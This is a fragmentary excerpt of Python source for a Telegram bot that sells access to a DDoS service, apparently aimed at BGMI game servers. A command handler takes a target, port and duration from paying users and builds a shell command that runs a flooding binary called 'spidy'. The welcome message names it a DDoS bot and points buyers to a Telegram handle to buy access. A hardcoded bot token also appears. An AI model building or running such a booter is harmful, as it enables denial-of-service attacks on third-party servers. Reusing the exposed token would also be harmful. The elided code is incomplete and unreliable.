...
bot = telebot.TeleBot('7847048322:AAGY3o9H1rx-s-Q6yKz7aIqLMXlueARDYZo')
...
def handle_bgmi(message):
    ...
    if user_id in allowed_user_ids:
        ...
        if len(command) == 4:  # Updated to accept target, time, and port
            ...
            if time > 600:
                ...
                full_command = f"./spidy {target} {port} {time} 100"
 ...
 🛒 𝑫𝑴 𝑯𝑬𝑹𝑬 𝑻𝑶 𝑩𝑼𝒀 𝑨𝑪𝑪𝑬𝑺𝑺 :- @HT_HASEEN"""
...
def welcome_start(message):
    ...
    response = f'''𝑾𝑬𝑳𝑪𝑶𝑴𝑬 𝑻𝑶 𝑺ARFIRA 𝑫𝑫𝒐𝑺 𝑩𝑶𝑻:- @HT_HASSEN
...
restarting bot polling to avoid flooding
